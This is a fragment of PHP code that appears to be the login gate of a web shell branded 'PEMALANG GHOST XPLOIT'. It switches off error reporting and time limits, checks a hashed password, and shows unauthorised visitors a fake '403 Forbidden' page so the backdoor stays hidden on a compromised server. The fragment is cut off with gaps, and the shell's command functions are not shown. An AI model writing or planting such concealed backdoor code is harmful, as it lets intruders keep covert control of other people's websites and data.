...
@error_reporting(0);
@set_time_limit(0);
$x = "81a5a3f0cc664b20441f7825c54ec205";
function Login() {
?>
<?php
...
<br><br><br><br><pre align=center><font face="Metal Mania" size="10" color="#FFFFFF">PEMALANG GHOST XPLOIT</font></pre><br><br>

<center><img src="https://raw.githubusercontent.com/Sniperxxx/web/main/anon.png" height="200" width="200"></center>

<br><br><br><pre align=center><form method=post><input type="password" name="pass"><input type="submit" value="LOGIN"></form></pre>';

}else{
echo '<html><head><html><title> 403 Forbidden </title><h1>Forbidden</h1>';

echo "You don't have permission to access $u";
echo  ' on this server';
echo '<br><br>';
